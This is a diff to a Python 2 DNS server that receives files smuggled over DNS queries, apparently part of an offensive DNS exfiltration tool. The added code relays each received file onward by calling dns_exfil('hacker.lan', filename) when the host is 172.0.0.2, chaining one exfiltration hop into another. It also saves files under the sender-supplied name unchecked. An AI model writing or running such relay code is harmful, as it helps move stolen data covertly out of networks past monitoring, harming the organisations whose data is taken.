@@ -140,6 +140,7 @@ def dns_server(host="demo.morirt.com", port=53, play_dead=True):
 			filename = data[data.find(INITIATION_STRING) + len(INITIATION_STRING):data.find(DELIMITER)]
 			crc32 = data[offset_delimiter: -1] 
 			sys.stdout.write("Initiation file transfer from " + str(addr) + " with file: " + str(filename))
+			print "\nreceiving data"
 			actual_file = ""
 			chunks_count = 0
 
@@ -156,11 +157,17 @@ def dns_server(host="demo.morirt.com", port=53, play_dead=True):
 			# Will now compare CRC32s:
 			if crc32 == str(zlib.crc32(actual_file)):
 				sys.stdout.write("CRC32 match! Now saving file")
-				fh = open(filename + str(crc32), WRITE_BINARY)
+				fh = open(filename, WRITE_BINARY) #+ str(crc32)
 				fh.write(actual_file) 
-				fh.close()
+				fh.close()					
 				replay = "Got it. Thanks :)"
 				s.sendto(replay, addr)
+				print "\ndata completely received"
+				if host=="172.0.0.2":
+					print "transfering data"
+					if dns_exfil("hacker.lan", filename) == 0:
+						print "File exfiltrated okay"
+					break
 
 			else:
 				sys.stderr.write("CRC32 not match. Not saving file.")
